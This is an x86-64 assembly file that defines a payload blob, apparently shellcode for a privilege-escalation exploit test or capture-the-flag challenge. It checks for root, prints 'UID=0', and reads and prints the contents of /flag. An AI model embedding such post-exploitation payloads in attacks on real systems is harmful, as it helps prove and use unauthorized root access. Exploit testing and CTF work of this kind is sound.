/* SPDX-License-Identifier: GPL-2.0 */
	.section .rodata.kapo,"a",@progbits
	.global kapo_payload_start
	.global kapo_payload_end
	.type kapo_payload_start, @object
kapo_payload_start:
	endbr64
	mov $107, %eax
	syscall
	test %eax, %eax
	jne .Lfail
	mov $1, %eax
	mov $1, %edi
	lea .Luid(%rip), %rsi
	mov $6, %edx
	syscall
	lea .Lflag(%rip), %rdi
	xor %esi, %esi
	xor %edx, %edx
	mov $2, %eax
	syscall
	test %eax, %eax
	js .Lfail
	mov %eax, %edi
	sub $128, %rsp
	mov %rsp, %rsi
	mov $128, %edx
	xor %eax, %eax
	syscall
	test %eax, %eax
	jle .Lfail
	mov %eax, %edx
	mov $1, %eax
	mov $1, %edi
	syscall
	xor %edi, %edi
	mov $60, %eax
	syscall
.Lfail:
	mov $1, %edi
	mov $60, %eax
	syscall
.Luid:
	.ascii "UID=0\n"
.Lflag:
	.asciz "/flag"
kapo_payload_end:
	.size kapo_payload_start, kapo_payload_end-kapo_payload_start
	.section .note.GNU-stack,"",@progbits
